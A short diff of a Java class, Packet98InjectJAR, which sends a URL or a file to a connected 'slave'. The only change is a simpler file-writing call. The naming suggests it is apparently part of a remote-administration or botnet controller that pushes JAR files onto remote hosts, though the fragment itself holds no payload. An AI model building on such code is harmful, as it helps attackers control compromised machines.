@@ -28,7 +28,7 @@ public class Packet98InjectJAR implements OutgoingPacket {
 		if (file == null) {
 			slave.writeLine(url);
 		} else {
-			new FileIO().writeFile(file, slave.getSocket(), slave.getDataOutputStream(), slave.getDataInputStream(), null, slave.getKey());
+			new FileIO().writeFile(file, slave.getDataOutputStream(), null);
 		}
 	}
 
